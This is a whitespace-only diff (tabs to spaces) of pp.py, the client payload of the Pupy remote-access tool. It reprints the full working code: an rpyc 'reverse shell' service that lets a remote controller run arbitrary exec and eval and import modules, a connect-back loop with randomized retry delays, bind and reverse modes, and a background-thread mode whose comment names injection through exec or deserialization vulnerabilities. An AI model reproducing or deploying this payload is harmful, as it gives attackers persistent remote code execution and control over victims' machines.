@@ -43,199 +43,199 @@ from network.base_launcher import LauncherError
 import logging
 import shlex
 try:
-	import additional_imports #additional imports needed to package with pyinstaller
+    import additional_imports #additional imports needed to package with pyinstaller
 except ImportError:
-	pass
+    pass
 logging.getLogger().setLevel(logging.DEBUG)
 
 LAUNCHER="connect" # the default launcher to start when no argv
 LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport ssl") # default launcher arguments
 
 REVERSE_SLAVE_CONF=dict(
-			allow_all_attrs = True,
-			allow_public_attrs = True,
-			allow_pickle = True,
-			allow_getattr = True,
-			allow_setattr = True,
-			allow_delattr = True,
-			import_custom_exceptions = False,
-			propagate_SystemExit_locally = True,
-			propagate_KeyboardInterrupt_locally = True,
-			instantiate_custom_exceptions = True,
-			instantiate_oldstyle_exceptions = True,
-		)
+            allow_all_attrs = True,
+            allow_public_attrs = True,
+            allow_pickle = True,
+            allow_getattr = True,
+            allow_setattr = True,
+            allow_delattr = True,
+            import_custom_exceptions = False,
+            propagate_SystemExit_locally = True,
+            propagate_KeyboardInterrupt_locally = True,
+            instantiate_custom_exceptions = True,
+            instantiate_oldstyle_exceptions = True,
+        )
 
 class ReverseSlaveService(Service):
-	""" Pupy reverse shell rpyc service """
-	__slots__=["exposed_namespace"]
-	def on_connect(self):
-		self.exposed_namespace = {}
-		self._conn._config.update(REVERSE_SLAVE_CONF)
-		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
-	def on_disconnect(self):
-		print "disconnecting !"
-		raise KeyboardInterrupt
-	def exposed_exit(self):
-		raise SystemExit
-	def exposed_execute(self, text):
-		"""execute arbitrary code (using ``exec``)"""
-		execute(text, self.exposed_namespace)
-	def exposed_get_infos(self, s):
-		"""execute arbitrary code (using ``exec``)"""
-		import pupy
-		if not s in pupy.infos:
-			return None
-		return pupy.infos[s]
-	def exposed_eval(self, text):
-		"""evaluate arbitrary code (using ``eval``)"""
-		return eval(text, self.exposed_namespace)
-	def exposed_getmodule(self, name):
-		"""imports an arbitrary module"""
-		return __import__(name, None, None, "*")
-	def exposed_getconn(self):
-		"""returns the local connection instance to the other side"""
-		return self._conn
+    """ Pupy reverse shell rpyc service """
+    __slots__=["exposed_namespace"]
+    def on_connect(self):
+        self.exposed_namespace = {}
+        self._conn._config.update(REVERSE_SLAVE_CONF)
+        self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
+    def on_disconnect(self):
+        print "disconnecting !"
+        raise KeyboardInterrupt
+    def exposed_exit(self):
+        raise SystemExit
+    def exposed_execute(self, text):
+        """execute arbitrary code (using ``exec``)"""
+        execute(text, self.exposed_namespace)
+    def exposed_get_infos(self, s):
+        """execute arbitrary code (using ``exec``)"""
+        import pupy
+        if not s in pupy.infos:
+            return None
+        return pupy.infos[s]
+    def exposed_eval(self, text):
+        """evaluate arbitrary code (using ``eval``)"""
+        return eval(text, self.exposed_namespace)
+    def exposed_getmodule(self, name):
+        """imports an arbitrary module"""
+        return __import__(name, None, None, "*")
+    def exposed_getconn(self):
+        """returns the local connection instance to the other side"""
+        return self._conn
 
 class BindSlaveService(ReverseSlaveService):
-	def on_connect(self):
-		self.exposed_namespace = {}
-		self._conn._config.update(REVERSE_SLAVE_CONF)
-		import pupy
-		if self._conn.root.get_password() != pupy.infos['launcher_inst'].args.password:
-			self._conn.close()
-			raise KeyboardInterrupt("wrong password")
-		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
+    def on_connect(self):
+        self.exposed_namespace = {}
+        self._conn._config.update(REVERSE_SLAVE_CONF)
+        import pupy
+        if self._conn.root.get_password() != pupy.infos['launcher_inst'].args.password:
+            self._conn.close()
+            raise KeyboardInterrupt("wrong password")
+        self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
 
 def get_next_wait(attempt):
-	if attempt<120:
-		return random.randint(5,10)/10.0
-	elif attempt<320:
-		return random.randint(30,50)/10.0
-	else:
-		return random.randint(150,300)/10.0
+    if attempt<120:
+        return random.randint(5,10)/10.0
+    elif attempt<320:
+        return random.randint(30,50)/10.0
+    else:
+        return random.randint(150,300)/10.0
 
-	
+    
 def add_pseudo_pupy_module(HOST):
-	""" add a pseudo pupy module for *nix payloads """
-	if not "pupy" in sys.modules:
-		mod = imp.new_module("pupy")
-		mod.__name__="pupy"
-		mod.__file__="<memimport>\\\\pupy"
-		mod.__package__="pupy"
-		sys.modules["pupy"]=mod
-		mod.get_connect_back_host=(lambda : HOST)
-		mod.pseudo=True
+    """ add a pseudo pupy module for *nix payloads """
+    if not "pupy" in sys.modules:
+        mod = imp.new_module("pupy")
+        mod.__name__="pupy"
+        mod.__file__="<memimport>\\\\pupy"
+        mod.__package__="pupy"
+        sys.modules["pupy"]=mod
+        mod.get_connect_back_host=(lambda : HOST)
+        mod.pseudo=True
 
 attempt=0
 
 def main():
-	global LAUNCHER
-	global LAUNCHER_ARGS
-	global attempt
+    global LAUNCHER
+    global LAUNCHER_ARGS
+    global attempt
 
-	if len(sys.argv)>1:
-		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
-		parser.add_argument('launcher', choices=[x for x in conf.launchers], help="the launcher to use")
-		parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher arguments")
-		args=parser.parse_args()
-		LAUNCHER=args.launcher
-		LAUNCHER_ARGS=shlex.split(' '.join(args.launcher_args))
+    if len(sys.argv)>1:
+        parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
+        parser.add_argument('launcher', choices=[x for x in conf.launchers], help="the launcher to use")
+        parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher arguments")
+        args=parser.parse_args()
+        LAUNCHER=args.launcher
+        LAUNCHER_ARGS=shlex.split(' '.join(args.launcher_args))
 
-	if not LAUNCHER in conf.launchers:
-		exit("No such launcher: %s"%LAUNCHER)
+    if not LAUNCHER in conf.launchers:
+        exit("No such launcher: %s"%LAUNCHER)
 
-	if "windows" in platform.system().lower():
-		try:
-			import pupy
-			config_file=pupy.get_pupy_config()
-			exec config_file in globals()
-		except ImportError:
-			logging.warning("ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")
-	while True:
-		try:
-			launcher=conf.launchers[LAUNCHER]()
-			try:
-				launcher.parse_args(LAUNCHER_ARGS)
-			except LauncherError as e:
-				launcher.arg_parser.print_usage()
-				exit(str(e))
+    if "windows" in platform.system().lower():
+        try:
+            import pupy
+            config_file=pupy.get_pupy_config()
+            exec config_file in globals()
+        except ImportError:
+            logging.warning("ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")
+    while True:
+        try:
+            launcher=conf.launchers[LAUNCHER]()
+            try:
+                launcher.parse_args(LAUNCHER_ARGS)
+            except LauncherError as e:
+                launcher.arg_parser.print_usage()
+                exit(str(e))
 
-			if "pupy" not in sys.modules:
-				add_pseudo_pupy_module(launcher.get_host())
-			else:
-				import pupy # necessary
-				pupy.get_connect_back_host=launcher.get_host
-			import pupy # also necessary
+            if "pupy" not in sys.modules:
+                add_pseudo_pupy_module(launcher.get_host())
+            else:
+                import pupy # necessary
+                pupy.get_connect_back_host=launcher.get_host
+            import pupy # also necessary
 
-			pupy.infos={} #global dictionary to store informations persistent through a deconnection
-			pupy.infos['launcher']=LAUNCHER
-			pupy.infos['launcher_args']=LAUNCHER_ARGS
-			pupy.infos['launcher_inst']=launcher
-			pupy.infos['transport']=launcher.get_transport()
-			rpyc_loop(launcher)
+            pupy.infos={} #global dictionary to store informations persistent through a deconnection
+            pupy.infos['launcher']=LAUNCHER
+            pupy.infos['launcher_args']=LAUNCHER_ARGS
+            pupy.infos['launcher_inst']=launcher
+            pupy.infos['transport']=launcher.get_transport()
+            rpyc_loop(launcher)
 
-		finally:
-			time.sleep(get_next_wait(attempt))
-			attempt+=1
+        finally:
+            time.sleep(get_next_wait(attempt))
+            attempt+=1
 
 def rpyc_loop(launcher):
-	global attempt
-	try:
-		for ret in launcher.iterate():
-			try:
-				if type(ret) is tuple: # bind payload
-					server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
-					s=server_class(BindSlaveService, port=port, hostname=address, authenticator=authenticator, stream=stream, transport=transport, transport_kwargs=transport_kwargs)
-					s.start()
+    global attempt
+    try:
+        for ret in launcher.iterate():
+            try:
+                if type(ret) is tuple: # bind payload
+                    server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
+                    s=server_class(BindSlaveService, port=port, hostname=address, authenticator=authenticator, stream=stream, transport=transport, transport_kwargs=transport_kwargs)
+                    s.start()
 
-				else: # connect payload
-					stream=ret
-					def check_timeout(event, cb, timeout=10):
-						start_time=time.time()
-						while True:
-							if time.time()-start_time>timeout:
-								if not event.is_set():
-									logging.error("timeout occured !")
-									cb()
-								break
-							elif event.is_set():
-								break
-							time.sleep(0.5)
-					event=threading.Event()
-					t=threading.Thread(target=check_timeout, args=(event, stream.close))
-					t.daemon=True
-					#t.start()
-					try:
-						conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
-					finally:
-						event.set()
-					while not stream.closed:
-						attempt=0
-						conn.serve(0.001)
-			except KeyboardInterrupt:
-				raise
-			except EOFError:
-				raise
-			except SystemExit:
-				raise
-			except Exception as e:
-				logging.error(e)
-				
-	except EOFError:
-		print "EOFError received, restarting the connection"
-	except KeyboardInterrupt:
-		print "keyboard interrupt raised, restarting the connection"
-	except SystemExit as e:
-		logging.error(e)
-		raise
-	except Exception as e:
-		logging.error(traceback.format_exc())
-		return
+                else: # connect payload
+                    stream=ret
+                    def check_timeout(event, cb, timeout=10):
+                        start_time=time.time()
+                        while True:
+                            if time.time()-start_time>timeout:
+                                if not event.is_set():
+                                    logging.error("timeout occured !")
+                                    cb()
+                                break
+                            elif event.is_set():
+                                break
+                            time.sleep(0.5)
+                    event=threading.Event()
+                    t=threading.Thread(target=check_timeout, args=(event, stream.close))
+                    t.daemon=True
+                    #t.start()
+                    try:
+                        conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
+                    finally:
+                        event.set()
+                    while not stream.closed:
+                        attempt=0
+                        conn.serve(0.001)
+            except KeyboardInterrupt:
+                raise
+            except EOFError:
+                raise
+            except SystemExit:
+                raise
+            except Exception as e:
+                logging.error(e)
+                
+    except EOFError:
+        print "EOFError received, restarting the connection"
+    except KeyboardInterrupt:
+        print "keyboard interrupt raised, restarting the connection"
+    except SystemExit as e:
+        logging.error(e)
+        raise
+    except Exception as e:
+        logging.error(traceback.format_exc())
+        return
 
 if __name__=="__main__":
-	main()
+    main()
 else:
-	t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
-	t.daemon=True
-	t.start()
+    t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
+    t.daemon=True
+    t.start()
 
